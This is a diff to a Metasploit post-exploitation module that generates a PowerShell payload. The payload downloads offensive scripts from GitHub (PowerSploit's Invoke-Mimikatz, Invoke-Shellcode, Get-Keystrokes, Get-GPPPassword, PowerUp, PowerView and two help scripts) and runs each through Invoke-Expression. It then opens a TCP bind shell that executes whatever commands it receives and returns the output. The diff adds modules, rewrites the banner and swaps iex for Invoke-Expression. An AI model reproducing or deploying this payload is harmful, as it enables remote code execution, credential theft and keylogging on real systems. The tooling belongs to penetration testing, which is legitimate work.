@@ -157,7 +157,9 @@ class Metasploit3 < Msf::Post
 	"'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Get-TimedScreenshot.ps1',\n"+
 	"'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1',\n"+
 	"'https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PowerUp/PowerUp.ps1',\n"+
-	"'https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PowerView/powerview.ps1')\n"+
+	"'https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PowerView/powerview.ps1',\n"+
+        "'https://raw.githubusercontent.com/davehardy20/PowerShell-Scripts/master/Get-Poweruphelp.ps1'\n"+
+        "'https://raw.githubusercontent.com/davehardy20/PowerShell-Scripts/master/Get-Powerviewhelp.ps1')\n"+
 	"\n"+
 	"    $listener = [System.Net.Sockets.TcpListener]"+datastore['LPORT']+"\n"+
 	"    $listener.start()\n"+
@@ -165,19 +167,21 @@ class Metasploit3 < Msf::Post
 	"    $client = $listener.AcceptTcpClient()\n"+
 	"    $stream = $client.GetStream() \n"+
 	"\n"+
-	"    $sendbytes = ([text.encoding]::ASCII).GetBytes(\"Windows PowerShell`nCopyright (C) 2014 Microsoft Corporation. All rights reserved.`n`nInvoke-Shellcode`nInvoke-DllInjection`nInvoke-Mimikatz`nInvoke-NinjaCopy`nGet-GPPPassword`nGet-Keystrokes`nGet-TimedScreenshot`nInvoke-ReflectivePEInjection`nPowerUp`nPowerView`n`nType 'Get-Help Invoke-Reflective -Full' for more details on any module.`n`n\")\n"+
-	"    $stream.Write($sendbytes,0,$sendbytes.Length)\n"+
+        "$sendbytes = ([text.encoding]::ASCII).GetBytes('Windows PowerShell`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`nInvoke-Shellcode`nInvoke-DllInjection`nInvoke-Mimikatz`nInvoke-NinjaCopy`nGet-GPPPassword`nGet-Keystrokes`nGet-TimedScreenshot`nInvoke-ReflectivePEInjection`nPowerUp`nPowerView`n`nType 'Get-Help Module-Name -Full' for more details on any module.`nFor help on the PowerUp and PowerView modules use Get-Poweruphelp and Get-Powerviewhelp to provide list of commands`n`n')\n"+
+        "$stream.Write($sendbytes,0,$sendbytes.Length)\n"+
+        "$sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')\n"+
+        "$stream.Write($sendbytes,0,$sendbytes.Length)\n"+
 	"\n"+
 	"    if ($download -eq 1) { ForEach ($module in $modules)\n"+
 	"    {\n"+
-	"       (Get-Webclient).DownloadString($module)|iex\n"+
+	"       (Get-Webclient).DownloadString($module)|Invoke-Expression\n"+
 	"    }}\n"+
 	"\n"+
 	"    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)\n"+
 	"    {\n"+
 	"        $EncodedText = New-Object System.Text.ASCIIEncoding\n"+
 	"        $data = $EncodedText.GetString($bytes,0, $i)\n"+
-	"        $sendback = (IEX $data 2>&1 | Out-String )\n"+
+	"        $sendback = (Invoke-Expression $data 2>&1 | Out-String )\n"+
 	"\n"+
 	"        $sendback2  = $sendback + \"PS \" + (get-location).Path + \"> \"\n"+
 	"	 $x = ($error[0] | out-string)\n"+
